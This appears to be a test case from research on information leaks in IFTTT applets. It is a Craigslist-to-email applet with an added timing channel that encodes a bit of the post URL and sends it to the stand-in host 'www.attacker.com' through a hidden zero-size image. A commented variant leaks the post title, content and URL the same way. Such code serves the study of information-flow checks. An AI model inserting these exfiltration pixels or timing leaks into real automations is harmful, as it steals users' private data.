//Maker: mckenziec
//Link2Applet: https://ifttt.com/applets/79p-get-an-email-whenever-a-new-craigslist-post-matches-your-search
//Title of Applet: Get an email whenever a new Craigslist post matches your search  
//Trigger service: Classifieds
//Action service: Email
//Policy/Presence: Confidentiality of posts / NO 

postTitle = lbl("Classifieds.newPostFromSearch.PostTitle");
postUrl = lbl("Classifieds.newPostFromSearch.PostUrl");
postContent = lbl("Classifieds.newPostFromSearch.PostContent");

var res = "";
var stime = Date.now();
var a = lbl(1); 
if (postUrl.charCodeAt(0) == 48) { a = lbl(10); while (a > 0) { a--; } }
else { a = lbl(0); while (a > 0) { a--; }  }
var etime = Date.now();
var b = etime-stime > 0 
if (b) { res += 0 }
else { res += 1 } 


postLink = urlh(postUrl); // '<link src=\"' + postUrl +'\">';
attack = imgl("www.attacker.com?" + res); // '<img src=\"www.attacker.com' + postTitle + postContent + postUrl + '\" style=\"width:0px;height:0px;\">';

sink('Email.sendMeEmail', 'setSubject', 'Interesting Posts');
sink('Email.sendMeEmail', 'setBody', postTitle + postContent + postLink + attack);




